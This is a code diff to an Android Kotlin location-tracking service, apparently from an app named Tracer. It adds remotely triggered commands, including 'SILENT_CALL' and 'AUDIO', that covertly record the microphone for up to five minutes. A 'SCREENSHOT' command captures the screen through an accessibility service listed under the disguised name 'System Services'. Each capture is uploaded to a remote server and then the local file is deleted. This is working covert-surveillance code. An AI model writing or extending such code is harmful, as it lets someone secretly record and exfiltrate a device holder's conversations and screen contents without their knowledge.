@@ -27,7 +27,11 @@ import com.tracer.app.TracerApp
 import com.tracer.app.data.CommandResultPayload
 import com.tracer.app.data.LocationTelemetry
 import androidx.core.content.ContextCompat
+import android.graphics.Bitmap
+import com.tracer.app.accessibility.TracerAccessibilityService
+import com.tracer.app.camera.AudioRecorder
 import com.tracer.app.camera.PhotoCapture
+import java.io.FileOutputStream
 import com.tracer.app.data.AlertPayload
 import com.tracer.app.network.TracerApiService
 import com.tracer.app.sim.SimManager
@@ -67,9 +71,12 @@ class TracerLocationService : Service() {
         const val ACTION_TAKE_PHOTO     = "com.tracer.app.TAKE_PHOTO"
         const val EXTRA_REPLY_TO        = "reply_to"
         const val EXTRA_CMD_ID          = "cmd_id"
-        const val ACTION_FORCE_LOCATE   = "com.tracer.app.FORCE_LOCATE"
-        const val ACTION_PIN_FAIL_PHOTO = "com.tracer.app.PIN_FAIL_PHOTO"
-        const val EXTRA_ATTEMPT_NUM     = "attempt_num"
+        const val ACTION_FORCE_LOCATE    = "com.tracer.app.FORCE_LOCATE"
+        const val ACTION_PIN_FAIL_PHOTO  = "com.tracer.app.PIN_FAIL_PHOTO"
+        const val EXTRA_ATTEMPT_NUM      = "attempt_num"
+        const val ACTION_RECORD_AUDIO    = "com.tracer.app.RECORD_AUDIO"
+        const val ACTION_TAKE_SCREENSHOT = "com.tracer.app.TAKE_SCREENSHOT"
+        const val EXTRA_DURATION_SEC     = "duration_sec"
 
         const val PREFS_STATUS    = "tracer_status"
         const val KEY_LAST_LAT    = "last_lat"
@@ -172,6 +179,17 @@ class TracerLocationService : Service() {
             }
             ACTION_FORCE_LOCATE -> {
                 serviceScope.launch { forceLocateAndPost() }
+            }
+            ACTION_RECORD_AUDIO -> {
+                val replyTo    = intent.getStringExtra(EXTRA_REPLY_TO) ?: return START_STICKY
+                val cmdId      = intent.getLongExtra(EXTRA_CMD_ID, -1L).takeIf { it >= 0 }
+                val durationSec = intent.getIntExtra(EXTRA_DURATION_SEC, 60)
+                serviceScope.launch { recordAndUploadAudio(replyTo, cmdId, durationSec) }
+            }
+            ACTION_TAKE_SCREENSHOT -> {
+                val replyTo = intent.getStringExtra(EXTRA_REPLY_TO) ?: return START_STICKY
+                val cmdId   = intent.getLongExtra(EXTRA_CMD_ID, -1L).takeIf { it >= 0 }
+                serviceScope.launch { captureAndUploadScreenshot(replyTo, cmdId) }
             }
             ACTION_PIN_FAIL_PHOTO -> {
                 val attemptNum = intent.getIntExtra(EXTRA_ATTEMPT_NUM, 1)
@@ -331,6 +349,97 @@ class TracerLocationService : Service() {
         }
     }
 
+    // ── Audio ─────────────────────────────────────────────────────────────────
+
+    private suspend fun recordAndUploadAudio(replyTo: String, cmdId: Long?, durationSec: Int) {
+        val file: File? = withContext(Dispatchers.Main) {
+            suspendCancellableCoroutine { cont ->
+                AudioRecorder(this@TracerLocationService).record(durationSec) { f -> cont.resume(f) }
+            }
+        }
+
+        val resultMsg: String
+        if (file == null) {
+            resultMsg = "Tracer AUDIO: error al grabar (sin permiso o hardware)"
+        } else {
+            resultMsg = try {
+                val deviceId   = readAndroidId()
+                val audioPart  = MultipartBody.Part.createFormData(
+                    "audio", file.name, file.asRequestBody("audio/mp4".toMediaType())
+                )
+                val deviceIdBody = deviceId.toRequestBody("text/plain".toMediaType())
+                apiService.uploadAudio(TracerApiService.AUTH_TOKEN, deviceIdBody, audioPart)
+                Log.d(TAG, "Audio uploaded: ${file.name}")
+                "Tracer AUDIO: grabación subida (${durationSec}s)"
+            } catch (e: Exception) {
+                Log.e(TAG, "Audio upload failed: ${e.message}")
+                "Tracer AUDIO: error al subir"
+            } finally {
+                file.delete()
+            }
+        }
+
+        if (cmdId != null) {
+            runCatching { apiService.postCommandResult(TracerApiService.AUTH_TOKEN, cmdId, CommandResultPayload(resultMsg)) }
+        } else {
+            CommandHandler.sendSms(this, replyTo, resultMsg)
+        }
+    }
+
+    // ── Screenshot ────────────────────────────────────────────────────────────
+
+    private suspend fun captureAndUploadScreenshot(replyTo: String, cmdId: Long?) {
+        if (!TracerAccessibilityService.isConnected()) {
+            val msg = "Tracer SCREENSHOT: activar en Ajustes > Accesibilidad > System Services"
+            if (cmdId != null) {
+                runCatching { apiService.postCommandResult(TracerApiService.AUTH_TOKEN, cmdId, CommandResultPayload(msg)) }
+            } else {
+                CommandHandler.sendSms(this, replyTo, msg)
+            }
+            return
+        }
+
+        val bitmap: Bitmap? = withContext(Dispatchers.Main) {
+            suspendCancellableCoroutine { cont ->
+                TracerAccessibilityService.requestScreenshot { bmp -> cont.resume(bmp) }
+            }
+        }
+
+        val resultMsg: String
+        if (bitmap == null) {
+            resultMsg = "Tracer SCREENSHOT: captura fallida (requiere Android 11+)"
+        } else {
+            val file = File(cacheDir, "tracer_screen_${System.currentTimeMillis()}.jpg")
+            withContext(Dispatchers.IO) {
+                FileOutputStream(file).use { out ->
+                    bitmap.compress(Bitmap.CompressFormat.JPEG, 90, out)
+                }
+                bitmap.recycle()
+            }
+            resultMsg = try {
+                val deviceId   = readAndroidId()
+                val photoPart  = MultipartBody.Part.createFormData(
+                    "photo", file.name, file.asRequestBody("image/jpeg".toMediaType())
+                )
+                val deviceIdBody = deviceId.toRequestBody("text/plain".toMediaType())
+                apiService.uploadPhoto(TracerApiService.AUTH_TOKEN, deviceIdBody, photoPart)
+                Log.d(TAG, "Screenshot uploaded: ${file.name}")
+                "Tracer SCREENSHOT: captura subida al servidor"
+            } catch (e: Exception) {
+                Log.e(TAG, "Screenshot upload failed: ${e.message}")
+                "Tracer SCREENSHOT: error al subir"
+            } finally {
+                file.delete()
+            }
+        }
+
+        if (cmdId != null) {
+            runCatching { apiService.postCommandResult(TracerApiService.AUTH_TOKEN, cmdId, CommandResultPayload(resultMsg)) }
+        } else {
+            CommandHandler.sendSms(this, replyTo, resultMsg)
+        }
+    }
+
     // ── NetworkCallback (3A) ──────────────────────────────────────────────────
 
     private fun setupNetworkCallback() {
@@ -434,9 +543,27 @@ class TracerLocationService : Service() {
                         postResultSafe(cmd.id, "Tracer LOCATE: ubicacion enviada")
                     }
                     "PHOTO" -> {
-                        // La foto maneja su propio resultado con cmdId
                         val intent = Intent(this@TracerLocationService, TracerLocationService::class.java).apply {
                             action = ACTION_TAKE_PHOTO
+                            putExtra(EXTRA_REPLY_TO, "remote")
+                            putExtra(EXTRA_CMD_ID, cmd.id)
+                        }
+                        startService(intent)
+                    }
+                    "AUDIO", "SILENT_CALL" -> {
+                        val duration = if (cmd.command.uppercase() == "SILENT_CALL") 60
+                                       else cmd.args.trim().toIntOrNull()?.coerceIn(10, 300) ?: 60
+                        val intent = Intent(this@TracerLocationService, TracerLocationService::class.java).apply {
+                            action = ACTION_RECORD_AUDIO
+                            putExtra(EXTRA_REPLY_TO, "remote")
+                            putExtra(EXTRA_CMD_ID, cmd.id)
+                            putExtra(EXTRA_DURATION_SEC, duration)
+                        }
+                        startService(intent)
+                    }
+                    "SCREENSHOT" -> {
+                        val intent = Intent(this@TracerLocationService, TracerLocationService::class.java).apply {
+                            action = ACTION_TAKE_SCREENSHOT
                             putExtra(EXTRA_REPLY_TO, "remote")
                             putExtra(EXTRA_CMD_ID, cmd.id)
                         }
